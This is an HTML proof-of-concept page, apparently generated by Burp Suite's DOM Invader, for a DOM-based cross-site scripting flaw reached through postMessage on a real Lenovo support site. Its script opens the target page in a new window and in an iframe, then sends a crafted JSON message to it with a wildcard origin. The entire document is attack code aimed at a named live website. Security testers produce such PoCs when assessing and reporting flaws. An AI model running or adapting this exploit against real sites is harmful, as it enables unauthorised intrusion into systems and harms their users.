<!doctype html>
<html>
    <head>
        <!-- DOM XSS PoC - generated by DOM Invader part of Burp Suite -->
        <meta charset="UTF-8" />
        <title>Postmessage PoC</title>
        <script>
            function pocLink() {
                // Opens a new window pointing to the target URL
                let win = window.open('https://pcsupport.lenovo.com/ae/ar/pagenotfound?item=%2Fjptvc%2Fmy-account');
                
                // Defines the message to be sent
                let msg = "{\n    \"type\": \"eSupportFootprintsIframe\",\n    \"key\": \"mtb6kq758-\",\n    \"value\": null\n}";
                
                // Parses the message from string to object
                msg = JSON.parse(msg);

                // Sends the message after 5 seconds to the new window
                setTimeout(function() {
                    win.postMessage(msg, '*');
                }, 5000);
            }

            function pocFrame(win) {           
                // Same message as in pocLink, sent to iframe
                let msg = "{\n    \"type\": \"eSupportFootprintsIframe\",\n    \"key\": \"mtb6kq758-\",\n    \"value\": null\n}";
                
                // Parses the message and sends it to the iframe content window
                msg = JSON.parse(msg);
                win.postMessage(msg, '*');          
            }
        </script>
    </head>
    <body>
        <!-- Link that triggers the pocLink function -->
        <a href="#" onclick="pocLink();">PoC link</a>          
        <!-- Iframe that loads the target URL and triggers the pocFrame function -->
        <iframe src="https://pcsupport.lenovo.com/ae/ar/pagenotfound?item=%2Fjptvc%2Fmy-account" onload="pocFrame(this.contentWindow)"></iframe>                    
    </body>
</html>
